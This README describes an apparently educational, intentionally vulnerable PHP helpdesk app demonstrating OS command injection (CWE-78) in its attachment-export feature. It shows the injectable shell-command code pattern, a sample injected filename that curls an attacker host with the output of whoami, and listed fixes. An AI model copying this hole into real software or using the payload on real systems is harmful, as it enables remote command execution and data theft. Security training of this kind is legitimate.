# Ticketdesk — IT Support Ticket Manager

A PHP helpdesk/ticketing system built as an **educational CWE-78 (OS Command Injection) demo** for security research and training datasets.

## Stack

- PHP 8.2 (vanilla, no framework)
- SQLite via PDO
- PHP sessions for authentication
- Bootstrap 5 (CDN)
- `password_hash` / `password_verify` for passwords

## Features

- Register / Login / Logout
- Submit support tickets (title, description, priority, category)
- View own tickets and track status
- Comment on tickets
- Upload file attachments to tickets
- **Export ticket attachments as ZIP** ← CWE-78 vulnerability lives here
- Admin panel: view all tickets, assign agents, change status
- Admin panel: user management list

## Quick Start (Docker)

```bash
docker-compose up --build
```

Open [http://localhost:3002](http://localhost:3002)

Default credentials: `admin` / `admin123`

## File Structure

```
ticketdesk/
  index.php        ← router + login/register
  tickets.php      ← ticket list/create/view/comment
  admin.php        ← admin panel
  export.php       ← attachment export (VULNERABLE - CWE-78)
  db.php           ← PDO setup + schema init
  auth.php         ← session helpers
  upload.php       ← file upload handler
  templates/
    header.php
    footer.php
  Dockerfile
  docker-compose.yml
  README.md
  .gitignore
```

## CWE-78 — OS Command Injection in export.php

**Vulnerability location:** `export.php`

**Description:**  
The export endpoint builds a shell command to create a ZIP archive of ticket attachments. It uses `basename()` on the stored filename to prevent path traversal — but `basename()` does **not** strip shell metacharacters (`;`, `|`, `$()`, backticks, etc.).

**Vulnerable code pattern:**

```php
$safe_name = basename($att['stored_name']);   // strips ../../ etc.
$full_path = '/var/uploads/' . $safe_name;
$file_list .= ' ' . $full_path;

// $file_list is injected directly into the shell command
$cmd = "zip -j {$zip_path}{$file_list}";
system($cmd);
```

**Attack vector:**  
An attacker who can control the `stored_name` value in the database (e.g., via a malicious upload flow or direct DB access) can inject a value like:

```
report.pdf; curl attacker.com/$(whoami)
```

After `basename()`, the semicolon remains intact and the shell executes the injected command.

**Fix (not applied here — this is intentionally vulnerable):**
- Use `escapeshellarg()` on each filename before appending to the command string.
- Or use `ZipArchive` PHP class instead of shell commands.

## Security Note

This application is **intentionally vulnerable** for educational and research purposes. Do **not** deploy it in a production environment or expose it to untrusted users.

## License

MIT
